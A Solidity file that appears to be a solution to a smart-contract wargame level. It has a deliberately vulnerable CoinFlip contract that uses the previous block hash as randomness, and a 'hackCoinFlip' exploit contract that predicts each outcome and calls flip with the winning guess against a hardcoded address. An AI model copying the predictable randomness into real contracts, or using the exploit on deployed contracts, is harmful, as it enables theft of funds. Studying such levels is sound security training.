// SPDX-License-Identifier: MIT
/**
   * @title CoinFlip
   * @dev ContractDescription
   * 
**/
pragma solidity ^0.8.0;

import "./SafeMath.sol";

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
contract hackCoinFlip {
    CoinFlip public originalContract = CoinFlip(0x8586Ff36369D5D05dEaC348E7741dE5491086b0d); 
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function hackFlip(bool _guess) public {
    
    // pre-deteremine the flip outcome
    uint256 blockValue = uint256(blockhash(block.number-1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    // If I guessed correctly, submit my guess
    if (side == _guess) {
        originalContract.flip(_guess);
    } else {
    // If I guess incorrectly, submit the opposite
        originalContract.flip(!_guess);
    }
}

}